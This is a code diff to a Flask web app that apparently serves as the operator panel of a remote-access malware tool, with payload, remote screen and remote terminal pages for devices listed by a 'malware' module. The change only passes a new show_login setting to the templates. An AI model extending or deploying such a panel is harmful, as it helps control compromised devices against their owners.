@@ -29,19 +29,19 @@ def get_credentials():
 def index():
     if not is_logged_in():
         return redirect(url_for('login'))  # Redirect to login page if not logged in
-    return render_template("index.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"])
+    return render_template("index.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"], show_login=get_credentials()["settings"]["require_login"])
 
 @app.route("/files")
 def upload():
     if not is_logged_in():
         return redirect(url_for('login'))
-    return render_template("upload.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"])
+    return render_template("upload.html", style=get_credentials()["style"]["light_mode"], ip_state=get_credentials()["style"]["private_ip"], show_login=get_credentials()["settings"]["require_login"])
 
 @app.route("/payload")
 def payload():
     if not is_logged_in():
         return redirect(url_for('login'))
-    return render_template("payload.html", style=get_credentials()["style"]["light_mode"])
+    return render_template("payload.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
 
 @app.route("/screen/<path:path>")
 def screen(path):
@@ -49,7 +49,7 @@ def screen(path):
         return redirect(url_for('login'))
     devices = malware.list_devices()
     if path in devices:
-        return render_template("screen.html", style=get_credentials()["style"]["light_mode"])
+        return render_template("screen.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
     else:
         return redirect("/")
 
@@ -59,7 +59,7 @@ def terminal(path):
         return redirect(url_for('login'))
     devices = malware.list_devices()
     if path in devices:
-        return render_template("terminal.html", style=get_credentials()["style"]["light_mode"])
+        return render_template("terminal.html", style=get_credentials()["style"]["light_mode"], show_login=get_credentials()["settings"]["require_login"])
     else:
         return redirect("/")
 
